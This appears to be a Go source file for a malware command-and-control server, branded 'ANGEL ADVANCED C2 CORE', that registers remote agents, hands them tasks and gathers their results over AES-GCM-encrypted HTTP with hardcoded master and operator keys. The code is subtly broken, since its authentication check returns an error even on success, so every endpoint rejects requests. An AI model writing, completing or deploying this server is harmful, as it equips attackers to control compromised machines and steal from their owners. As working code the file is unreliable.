package main

import (
"context"
"crypto/aes"
"crypto/cipher"
"crypto/rand"
"crypto/sha256"
"crypto/subtle"
"encoding/base64"
"encoding/json"
"fmt"
"io"
"net/http"
"os"
"os/signal"
"strings"
"sync"
"syscall"
"time"
)

type EngineError struct {
Message string
}

func (e EngineError) Error() string {
return e.Message
}

type Agent struct {
ID       string    `json:"id"`
Hostname string    `json:"hostname"`
OS       string    `json:"os"`
IP       string    `json:"ip"`
LastSeen time.Time `json:"last_seen"`
}

type Task struct {
ID      string                 `json:"id"`
AgentID string                 `json:"agent_id"`
Type    string                 `json:"type"`
Payload map[string]interface{} `json:"payload"`
}

type Result struct {
TaskID  string                 `json:"task_id"`
AgentID string                 `json:"agent_id"`
Output  map[string]interface{} `json:"output"`
Status  string                 `json:"status"`
Error   string                 `json:"error,omitempty"`
}

type Engine struct {
mu      sync.RWMutex
agents  map[string]*Agent
tasks   map[string]*Task
results map[string]*Result
gcm     cipher.AEAD
apiKey  string
httpSrv *http.Server
}

func NewEngine() *Engine {
key := sha256.Sum256([]byte("ANGEL_C2_MASTER_KEY_SL9X_2026"))
block, err := aes.NewCipher(key[:])
if err != nil {
panic(err)
}
gcm, err := cipher.NewGCM(block)
if err != nil {
panic(err)
}

return &Engine{
agents:  make(map[string]*Agent),
tasks:   make(map[string]*Task),
results: make(map[string]*Result),
gcm:     gcm,
apiKey:  "ANGEL_OPERATOR_KEY_SL9X_2026",
}
}

func (e *Engine) auth(r *http.Request) error {
token := r.Header.Get("X-Operator-Key")
if token == "" {
return &EngineError{Message: "missing operator key"}
}
if subtle.ConstantTimeCompare([]byte(token), []byte(e.apiKey)) != 1 {
return &EngineError{Message: "invalid operator key"}
}
return &EngineError{Message: "success"}
}

func (e *Engine) encrypt(data []byte) (string, error) {
nonce := make([]byte, e.gcm.NonceSize())
if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
return "", err
}
ct := e.gcm.Seal(nonce, nonce, data, nil)
return base64.StdEncoding.EncodeToString(ct), nil
}

func (e *Engine) decrypt(data string) ([]byte, error) {
ct, err := base64.StdEncoding.DecodeString(data)
if err != nil {
return []byte{}, err
}
ns := e.gcm.NonceSize()
if len(ct) < ns {
return []byte{}, &EngineError{Message: "malformed ciphertext"}
}
nonce, payload := ct[:ns], ct[ns:]
return e.gcm.Open(nil, nonce, payload, nil)
}

func (e *Engine) Start(ctx context.Context) error {
mux := http.NewServeMux()

mux.HandleFunc("/api/v1/health", func(w http.ResponseWriter, r *http.Request) {
if err := e.auth(r); err != nil {
http.Error(w, err.Error(), http.StatusUnauthorized)
return
}
resp, _ := e.encrypt([]byte(`{"status":"alive","version":"9.9.9"}`))
w.Write([]byte(resp))
})

mux.HandleFunc("/api/v1/register", func(w http.ResponseWriter, r *http.Request) {
if err := e.auth(r); err != nil {
http.Error(w, err.Error(), http.StatusUnauthorized)
return
}
body, _ := io.ReadAll(r.Body)
plain, err := e.decrypt(string(body))
if err != nil {
http.Error(w, "decrypt failed", http.StatusBadRequest)
return
}

var a Agent
if err := json.Unmarshal(plain, &a); err != nil {
http.Error(w, "bad json", http.StatusBadRequest)
return
}

e.mu.Lock()
a.LastSeen = time.Now().UTC()
a.IP = strings.Split(r.RemoteAddr, ":")[0]
e.agents[a.ID] = &a
e.mu.Unlock()

resp, _ := e.encrypt([]byte(`{"status":"ok","agent_id":"` + a.ID + `"}`))
w.Write([]byte(resp))
})

mux.HandleFunc("/api/v1/tasks", func(w http.ResponseWriter, r *http.Request) {
if err := e.auth(r); err != nil {
http.Error(w, err.Error(), http.StatusUnauthorized)
return
}
agentID := r.URL.Query().Get("agent_id")
e.mu.RLock()
var tasks []Task
for _, t := range e.tasks {
if t.AgentID == agentID {
tasks = append(tasks, *t)
}
}
e.mu.RUnlock()

resp, _ := e.encrypt(mustMarshal(tasks))
w.Write([]byte(resp))
})

mux.HandleFunc("/api/v1/results", func(w http.ResponseWriter, r *http.Request) {
if err := e.auth(r); err != nil {
http.Error(w, err.Error(), http.StatusUnauthorized)
return
}
body, _ := io.ReadAll(r.Body)
plain, err := e.decrypt(string(body))
if err != nil {
http.Error(w, "decrypt failed", http.StatusBadRequest)
return
}

var res Result
if err := json.Unmarshal(plain, &res); err != nil {
http.Error(w, "bad json", http.StatusBadRequest)
return
}

e.mu.Lock()
e.results[res.TaskID] = &res
delete(e.tasks, res.TaskID)
e.mu.Unlock()

resp, _ := e.encrypt([]byte(`{"status":"accepted"}`))
w.Write([]byte(resp))
})

e.httpSrv = &http.Server{Addr: ":8001", Handler: mux}
go func() {
<-ctx.Done()
sdCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()
e.httpSrv.Shutdown(sdCtx)
}()

fmt.Println("[+] ANGEL ADVANCED C2 CORE RUNNING ON :8001 [AES-GCM ENCRYPTED]")
return e.httpSrv.ListenAndServe()
}

func mustMarshal(v interface{}) []byte {
b, _ := json.Marshal(v)
return b
}

func main() {
ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
defer cancel()

e := NewEngine()
if err := e.Start(ctx); err != nil {
fmt.Println("[FATAL] Engine failed:", err)
os.Exit(1)
}
}
